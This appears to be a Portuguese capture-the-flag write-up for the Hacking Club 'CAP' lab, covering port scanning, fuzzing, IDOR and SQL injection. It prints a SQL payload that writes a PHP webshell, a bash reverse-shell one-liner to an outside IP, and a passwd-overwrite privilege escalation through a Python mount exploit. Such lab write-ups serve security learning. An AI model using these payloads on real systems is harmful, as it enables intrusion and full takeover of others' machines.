@@ -1,0 +1,188 @@
+---
+title: 'CAP Writeup'
+date: '2024-11-14'
+tags: ['API REST', 'SQLI', 'IDOR', 'Linux']
+draft: false
+summary: 'A aplicação possui as vulnerabilidades: enumeração de endpoints via FUZZ, SQL Injection, execução de comandos remotos (RCE) e escalonamento de privilégios via capabilities no Linux.'
+images: ['/static/images/cap-writeup-images/default.png']
+authors: ['default']
+---
+
+![logo](/static/images/cap-writeup-images/default.png)
+
+## **Plataforma**: Hacking Club
+
+### **Dificuldade:** Medium
+
+### **Nome**: CAP
+
+---
+
+### **Port Scanning**
+
+`nmap -sV -sC -p- -v $IP --open`
+
+```bash
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
+| ssh-hostkey:
+|   2048 ae:5c:8b:8d:2f:10:85:62:01:ea:74:f5:49:38:02:33 (RSA)
+|   256 64:e1:6d:0e:6c:53:87:eb:2a:07:38:6a:34:47:fc:b4 (ECDSA)
+|_  256 08:53:53:7e:20:20:6e:21:9b:0c:36:fa:2b:11:73:f4 (ED25519)
+80/tcp   open  http    Apache httpd 2.4.48 (() PHP/7.4.15)
+| http-cookie-flags:
+|   /:
+|     PHPSESSID:
+|_      httponly flag not set
+|_http-title: Site doesn't have a title (application/json).
+| http-methods:
+|_  Supported Methods: GET HEAD
+|_http-server-header: Apache/2.4.48 () PHP/7.4.15
+111/tcp  open  rpcbind 2-4 (RPC #100000)
+| rpcinfo:
+|   program version    port/proto  service
+|   100000  2,3,4        111/tcp   rpcbind
+|   100000  2,3,4        111/udp   rpcbind
+|   100000  3,4          111/tcp6  rpcbind
+|_  100000  3,4          111/udp6  rpcbind
+3306/tcp open  mysql   MariaDB (unauthorized)
+
+```
+
+---
+
+## **Enumeration**
+
+`http://172.16.3.201`
+
+![cap](/static/images/cap-writeup-images/image.png)
+
+### Fuzzing
+
+`ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://172.16.3.201/FUZZ -e .php,.zip -ic`
+
+Esqueci da print 😄
+
+```bash
+backup.zip              [Status: 200, Size: 59088, Words: 251, Lines: 209, Duration: 214ms]
+
+```
+
+Arquivo `backup.zip` achado via fuzzing.
+
+![cap 1](/static/images/cap-writeup-images/image1.png)
+
+Após unzipar, temos o código da aplicação:
+
+![cap 2](/static/images/cap-writeup-images/image2.png)
+
+A aplicação se trata de um Slim, um framework do php utilizado principalmente em criações de aplicações web e APIS simples, mas poderosas.
+
+### Code Review
+
+Temos a rota `/_ul/:controller/(:parameter)`
+
+![cap 3](/static/images/cap-writeup-images/image3.png)
+
+- `/_ul/`: A URL começa com `/_ul/`, que pode ser o início de um caminho de uma API ou URL para uma funcionalidade específica.
+- `:controller`: A parte `:controller` é um **parametro dinâmico**. No Slim, quando se usa `:parametro`, ele indica que esse segmento da URL será capturado e passado como parâmetro para a função de callback. Nesse caso, ele vai estar utilizando a classe `usuarios` da API.
+- `(/:parameter)`: O parâmetro `parameter` é opcional, como indicado pelos parênteses ao redor dele. Se presente, ele será capturado e passado para a função. Caso contrário, o parâmetro `parameter` terá o valor `null` por padrão.
+
+A classe usuários que o :parametro vai utilizar, se trata de uma consulta no banco de dados, mais especificamente para buscar informações sobre os usuários.
+
+![cap 4](/static/images/cap-writeup-images/image4.png)
+
+Ou seja a rota completa seria `/_ul/usuarios/{id}` , aonde o ID seria o dado inserido pra ser pesquisado no banco de dados.
+
+`http://172.16.3.201/_ul/usuarios/1`
+
+![cap 5](/static/images/cap-writeup-images/image5.png)
+
+Podemos ver que a API em questão esta vulneravel a IDOR.
+
+`http://172.16.3.201/_ul/usuarios/2`
+
+![cap 6](/static/images/cap-writeup-images/image6.png)
+
+Além do IDOR, podemos identificar um SQL Injection, pois a aplicação não esta realizando nenhum tipo de sanitização na hora da consulta no banco de dados.
+
+![cap 7](/static/images/cap-writeup-images/image7.png)
+
+Quando passamos uma aspas simples, vemos que ele quebra a query de consulta.
+
+![cap 8](/static/images/cap-writeup-images/image8.png)
+
+Novamente, olhando o código, podemos perceber que a API faz uma requisição do tipo POST que podemos utilizar para subir uma webshell.
+
+o `include_once` está incluindo um arquivo e executando o que esta dentro dele, o torna possível uma web shell.
+
+![cap 9](/static/images/cap-writeup-images/image9.png)
+
+No caso, gravaríamos a webshell em `/var/www/html/classes/webshell.php`
+
+`3 UNION SELECT 1,"<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/classes/shell.class.php'#`
+
+![cap 10](/static/images/cap-writeup-images/image10.png)
+
+A aplicação retornou null, ou seja funcionou!
+
+Pra acessar a web shell ,teremos que mandar uma requisição do tipo POST, para a URL `/_ul/shell.php?cmd=id`
+
+![cap 11](/static/images/cap-writeup-images/image11.png)
+
+---
+
+## Foot Hold
+
+`bash -c 'exec bash -i &>/dev/tcp/10.0.31.150/1337 <&1'`
+
+OBS: Lembre de encodar a payload com `CTRL+U` no Burp.
+
+![cap 12](/static/images/cap-writeup-images/image12.png)
+
+![cap 13](/static/images/cap-writeup-images/image13.png)
+
+---
+
+## Privillege Escalation
+
+`getcap -r / 2>/dev/null`
+
+![cap 14](/static/images/cap-writeup-images/image14.png)
+
+```
+cp /etc/passwd ./ #Cria uma cópia do /etc/passwd
+openssl passwd -1 -salt abc password #Cria o Hash pra colocar no /tmp/passwd
+nano /etc/passwd #Troca a senha do root para 'password'
+
+```
+
+![cap 15](/static/images/cap-writeup-images/image15.png)
+
+Por fim só executar o `exploit.py`
+
+```python
+#exploit.py
+from ctypes import *
+libc = CDLL("libc.so.6")
+libc.mount.argtypes = (c_char_p, c_char_p, c_char_p, c_ulong, c_char_p)
+MS_BIND = 4096
+source = b"/tmp/passwd"
+target = b"/etc/passwd"
+filesystemtype = b"none"
+options = b"rw"
+mountflags = MS_BIND
+libc.mount(source, target, filesystemtype, mountflags, options)
+```
+
+![cap 16](/static/images/cap-writeup-images/image16.png)
+
+### Referencia
+
+https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities
+
+---
+
+## Proof
+
+![cap 17](/static/images/cap-writeup-images/image17.png)
